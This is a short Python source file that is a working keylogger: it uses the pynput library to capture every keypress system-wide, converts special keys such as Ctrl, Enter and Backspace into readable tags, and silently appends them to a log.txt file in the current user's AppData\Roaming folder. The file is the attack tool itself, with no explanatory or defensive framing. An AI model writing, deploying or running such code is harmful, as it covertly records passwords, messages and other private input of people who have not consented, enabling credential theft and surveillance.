import os
from pynput.keyboard import Listener

users = os.getlogin()

print(users)

def anonymous(key):
    key = str(key)
    key = key.replace("'", "")
    if key == "Key.ctrl_l":
        key = " [Ctrl] "
    if key == "Key.enter":
        key = "\n"
    if key == "Key.ctrl_r":
        key = " [Ctrl] "
    if key == "Key.alt_l":
        key = " [Alt] "
    if key == "Key.alt_r":
        key = " [Alt] "
    if key == "Key.tab":
        key = "   "
    if key == "Key.shift":
        key = " [shift] "
    if key == "Key.backspace":
        key = " < "
    if key == "Key.caps_lock":
        key = " [Caps Lock] "
    if key == "Key.space":
        key = " "

    with open(f"C:\\Users\\{users}\\AppData\\Roaming\\log.txt", "a") as file:
        file.write(key)

with Listener(on_press=anonymous) as listener:
    listener.join()